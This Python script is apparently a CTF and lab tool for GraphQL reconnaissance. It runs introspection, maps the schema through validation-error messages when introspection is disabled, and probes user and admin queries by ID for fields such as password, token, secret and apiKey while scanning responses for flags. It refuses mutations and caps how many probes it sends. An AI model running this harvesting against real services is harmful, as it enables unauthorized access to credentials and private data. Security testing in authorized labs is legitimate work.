#!/usr/bin/env python3
"""graphqlquick.py — bounded read-only GraphQL fast track for authorized web labs.

Run this after authentication when JS mining or recon finds a GraphQL endpoint.
It checks anonymous/authenticated reachability, attempts introspection, and falls
back to validation-error schema oracles when introspection is disabled. It only
sends query operations; mutations are never generated.

Exit codes: 0 completed (including flag found), 2 inconclusive/rate-limited,
3 gateway/request circuit breaker, 4 invalid arguments.
"""
import argparse
import json
import os
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
GATEWAY_FAILURES = {502, 503, 504}
ROOT_CANDIDATES = (
    "user", "users", "me", "viewer", "currentUser", "profile", "account",
    "node", "admin", "activityLogs", "auditLogs",
)
LEAF_CANDIDATES = (
    "flag", "password", "token", "secret", "apiKey", "api_key",
    "accessToken", "id", "username", "email", "role",
)
INTROSPECTION_QUERY = """{
  __schema {
    queryType {
      fields {
        name
        args { name type { kind name ofType { kind name } } }
        type { kind name ofType { kind name } }
      }
    }
  }
}"""


class FoundFlag(RuntimeError):
    pass


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


class SafetyRefusal(RuntimeError):
    """The harness declined to send something, as opposed to being misconfigured."""


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def error_messages(response):
    try:
        data = response.json()
    except ValueError:
        return []
    errors = data.get("errors", []) if isinstance(data, dict) else []
    return [str(item.get("message", "")) for item in errors if isinstance(item, dict)]


def required_args(messages, root):
    out = []
    pattern = re.compile(
        r'Field\s+["\']%s["\']\s+argument\s+["\']([A-Za-z_]\w*)["\']\s+'
        r'of type\s+["\']([^"\']+)["\']\s+is required' % re.escape(root), re.I)
    for message in messages:
        out.extend(pattern.findall(message))
    return unique(out)


def suggested_roots(messages):
    suggestions = []
    for message in messages:
        if "Did you mean" not in message:
            continue
        tail = message.split("Did you mean", 1)[1]
        suggestions.extend(re.findall(r'["\']([A-Za-z_]\w*)["\']', tail))
    return unique(suggestions)


def unknown_field(messages, field):
    lowered = field.lower()
    return any("cannot query field" in message.lower() and lowered in message.lower()
               for message in messages)


def named_type(type_info):
    current = type_info if isinstance(type_info, dict) else {}
    while current:
        if current.get("name"):
            return current.get("name")
        current = current.get("ofType") or {}
    return ""


def is_required(type_info):
    return isinstance(type_info, dict) and type_info.get("kind") == "NON_NULL"


def gql_value(value, gql_type):
    base = (gql_type or "").replace("!", "").strip("[]")
    if base in ("Int", "Float"):
        return str(value)
    if base == "Boolean":
        return "true"
    # Numeric literals are valid ID values and are faster to reuse across ID/unknown types.
    if base in ("ID", "") and str(value).isdigit():
        return str(value)
    return json.dumps(str(value))


class FastTrack:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.auth_headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        }
        if args.token:
            self.auth_headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.auth_headers["Cookie"] = args.cookie
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            self.auth_headers[key.strip()] = value.strip()
        self.anon_headers = {
            key: value for key, value in self.auth_headers.items()
            if key.lower() not in ("authorization", "cookie")
        }
        self.has_auth = bool(args.token or args.cookie)
        self.count = 0
        self.seen_queries = set()
        self.flags = set()
        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def _record(self, label, query, authenticated, response):
        if isinstance(response, Exception):
            record = {
                "label": label, "query": query, "authenticated": authenticated,
                "error": repr(response),
            }
        else:
            record = {
                "label": label,
                "query": query,
                "authenticated": authenticated,
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": (response.text or "")[:8000],
            }
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, query, label, authenticated=True):
        normalized = " ".join(query.split())
        key = (normalized, bool(authenticated and self.has_auth))
        if key in self.seen_queries:
            return None
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if re.search(r'\bmutation\b', query, re.I):
            raise SafetyRefusal("graphqlquick refuses mutation operations")
        self.seen_queries.add(key)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        headers = self.auth_headers if authenticated else self.anon_headers
        try:
            response = self.session.post(
                self.args.url, headers=headers, json={"query": query},
                timeout=self.args.timeout, allow_redirects=False, verify=False)
        except requests.RequestException as exc:
            self._record(label, query, authenticated, exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, query, authenticated, response)
        auth_label = "auth" if authenticated and self.has_auth else "anon"
        print("[%02d/%02d] %-5s %-26s HTTP %d %db" % (
            self.count, self.args.max_probes, auth_label, label,
            response.status_code, len(response.content)))
        scan = (response.text or "") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        hits = set(FLAG_RE.findall(scan))
        if hits:
            self.flags.update(hits)
            for hit in sorted(hits):
                print("FLAG %s" % hit)
            raise FoundFlag()
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response

    def root_expression(self, root, args, ident):
        if not args:
            return root
        rendered = []
        for name, gql_type in args:
            if not (name.lower() == "id" or name.lower().endswith("id")):
                return None
            rendered.append("%s: %s" % (name, gql_value(ident, gql_type)))
        return "%s(%s)" % (root, ", ".join(rendered))

    def probe_root(self, root, args):
        idents = unique(["1", str(self.args.id) if self.args.id is not None else None])
        if not args:
            idents = [None]
        for ident in idents:
            expr = self.root_expression(root, args, ident)
            if expr is None:
                print("[!] skip %s: required argument is not identity-shaped" % root)
                return
            for leaf in unique(self.args.leaf + list(LEAF_CANDIDATES)):
                query = "{ %s { %s } }" % (expr, leaf)
                response = self.send(query, "%s.%s" % (root, leaf))
                if response is None:
                    continue
                messages = error_messages(response)
                if not messages:
                    try:
                        data = response.json().get("data")
                    except (ValueError, AttributeError):
                        data = None
                    if data and data.get(root) is not None:
                        print("    [+] resolved %s.%s" % (root, leaf))

    def roots_from_schema(self, response):
        try:
            fields = response.json()["data"]["__schema"]["queryType"]["fields"]
        except (ValueError, KeyError, TypeError):
            return []
        ranked = []
        for field in fields or []:
            if not isinstance(field, dict) or not field.get("name"):
                continue
            args = []
            unsupported_required = False
            for arg in field.get("args") or []:
                if not isinstance(arg, dict):
                    continue
                arg_type = named_type(arg.get("type"))
                if is_required(arg.get("type")):
                    args.append((arg.get("name", ""), arg_type))
                    if not (arg.get("name", "").lower() == "id"
                            or arg.get("name", "").lower().endswith("id")):
                        unsupported_required = True
            if unsupported_required:
                continue
            name = field["name"]
            priority = 0 if re.search(
                r'user|account|profile|viewer|admin|node|flag|secret|token|log', name, re.I) else 1
            ranked.append((priority, name, args))
        ranked.sort(key=lambda item: (item[0], item[1]))
        return [(name, args) for _, name, args in ranked[:self.args.max_roots]]

    def run(self):
        if self.has_auth:
            self.send("{ __typename }", "anonymous typename", authenticated=False)
        self.send("{ __typename }", "authenticated typename")
        introspection = self.send(INTROSPECTION_QUERY, "introspection")
        schema_roots = self.roots_from_schema(introspection)
        if schema_roots:
            print("[+] introspection exposed %d bounded query root(s)" % len(schema_roots))
            for root, args in schema_roots:
                self.probe_root(root, args)
            return

        print("[*] introspection unavailable; using validation-error schema oracle")
        queue = unique(self.args.root + list(ROOT_CANDIDATES))
        seen = set()
        while queue and len(seen) < self.args.max_roots:
            root = queue.pop(0)
            if root in seen:
                continue
            seen.add(root)
            response = self.send("{ %s }" % root, "oracle %s" % root)
            if response is None:
                continue
            messages = error_messages(response)
            for suggestion in suggested_roots(messages):
                if suggestion not in seen:
                    queue.append(suggestion)
            if unknown_field(messages, root):
                continue
            args = required_args(messages, root)
            self.probe_root(root, args)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="full GraphQL endpoint URL")
    parser.add_argument("--token")
    parser.add_argument("--cookie")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--id", help="current low-privilege identity; ID 1 is always tried first")
    parser.add_argument("--root", action="append", default=[], help="prepend a safe Query root")
    parser.add_argument("--leaf", action="append", default=[], help="prepend a candidate leaf field")
    parser.add_argument("--out", default="graphqlquick_out")
    parser.add_argument("--max-probes", type=int, default=48)
    parser.add_argument("--max-roots", type=int, default=12)
    parser.add_argument("--delay", type=float, default=0.05)
    parser.add_argument("--timeout", type=float, default=20)
    args = parser.parse_args()
    if args.max_probes < 1 or args.max_roots < 1 or args.delay < 0 or args.timeout <= 0:
        print("invalid probe/root/delay/timeout bound", file=sys.stderr)
        return 4
    try:
        tracker = FastTrack(args)
        tracker.run()
    except FoundFlag:
        return 0
    except Inconclusive as exc:
        print("INCONCLUSIVE: %s" % exc, file=sys.stderr)
        return 2
    except (CircuitBreak, BudgetExhausted) as exc:
        label = "CIRCUIT BREAKER" if isinstance(exc, CircuitBreak) else "BOUNDED STOP"
        print("%s: %s" % (label, exc), file=sys.stderr)
        return 3 if isinstance(exc, CircuitBreak) else 0
    except SafetyRefusal as exc:
        print("SAFETY REFUSAL: %s" % exc, file=sys.stderr)
        return 4
    except ValueError as exc:
        print("INVALID ARGUMENT: %s" % exc, file=sys.stderr)
        return 4
    print("[*] completed %d read-only probe(s); no flag found" % tracker.count)
    return 0


if __name__ == "__main__":
    sys.exit(main())
